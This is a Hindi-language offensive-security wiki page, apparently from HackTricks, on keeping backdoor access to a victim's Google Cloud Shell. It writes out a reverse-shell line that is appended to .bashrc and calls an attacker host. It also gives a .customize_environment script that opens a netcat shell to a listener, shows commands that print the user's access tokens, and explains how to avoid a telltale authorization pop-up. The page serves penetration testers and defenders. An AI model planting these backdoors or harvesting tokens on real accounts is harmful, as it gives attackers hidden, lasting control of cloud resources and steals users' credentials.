# GCP - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) आपको अपने ब्राउज़र से सीधे आपके क्लाउड संसाधनों के लिए command-line एक्सेस देता है बिना किसी संबंधित लागत के।

आप Google's Cloud Shell को **web console** से या **`gcloud cloud-shell ssh`** चलाकर एक्सेस कर सकते हैं।

यह कंसोल attackers के लिए कुछ महत्वपूर्ण क्षमताएँ प्रदान करता है:

1. **Any Google user with access to Google Cloud** का access एक fully authenticated Cloud Shell instance है (Service Accounts भी कर सकते हैं, यहाँ तक कि org के Owners होने पर भी)।
2. उक्त instance यदि कोई activity नहीं होती है तो अपना **home directory कम से कम 120 दिनों तक** बनाए रखेगा।
3. उस instance की activity की निगरानी करने के लिए किसी organisation के पास **कोई क्षमता नहीं** है।

इसका मूलतः मतलब है कि एक attacker उपयोगकर्ता के home directory में backdoor रख सकता है और जब तक उपयोगकर्ता कम से कम हर 120 दिनों में एक बार GC Shell से जुड़ता रहता है, backdoor जीवित रहेगा और attacker हर बार shell प्राप्त कर लेगा बस इसे चलाकर:

<details>

<summary>reverse shell को .bashrc में जोड़ें</summary>
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
</details>

होम फ़ोल्डर में एक और फ़ाइल है जिसका नाम **`.customize_environment`** है जो, यदि मौजूद हो, तो उपयोगकर्ता **cloud shell** तक पहुँचने पर **हर बार निष्पादित** होगी (जैसा कि पिछली तकनीक में)। बस पिछला backdoor डाल दें या नीचे दिए गए की तरह एक backdoor डालकर persistence बनाए रखें जब तक उपयोगकर्ता "अक्सर" **cloud shell** का उपयोग करता है:

<details>

<summary>.customize_environment backdoor बनाएं</summary>
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
</details>

> [!WARNING]
> यह ध्यान रखना महत्वपूर्ण है कि **जब भी पहली बार कोई authentication की आवश्यकता वाली कार्रवाई की जाती है**, उपयोगकर्ता के ब्राउज़र में एक pop-up authorization window दिखाई देता है। इस window को स्वीकार किए बिना command नहीं चल पाएगा। यदि कोई अनपेक्षित pop-up दिखाई देता है, तो इससे शक पैदा हो सकता है और संभावित रूप से उपयोग की जा रही persistence method compromise हो सकती है।

This is the pop-up from executing `gcloud projects list` from the cloud shell (as attacker) viewed in the browsers user session:

<figure><img src="../../../images/image (10).png" alt=""><figcaption></figcaption></figure>

हालाँकि, अगर उपयोगकर्ता ने सक्रिय रूप से cloudshell का उपयोग किया है, तो pop-up नहीं दिखाई देगा और आप **उपयोगकर्ता के tokens इकट्ठा कर सकते हैं**:

<details>

<summary>Cloud Shell से access tokens प्राप्त करें</summary>
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
</details>

#### SSH कनेक्शन कैसे स्थापित होता है

आम तौर पर, ये 3 API कॉल्स उपयोग में लाई जाती हैं:

- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (यह आपको अपने लोकल रूप में बनाया गया public key जोड़ने के लिए कहेगा)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (यह instance शुरू करने के लिए कहेगा)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (यह आपको google cloud shell का IP बताएगा)

लेकिन आप और जानकारी पा सकते हैं [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## संदर्भ

- [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
- [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
- [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{{#include ../../../banners/hacktricks-training.md}}
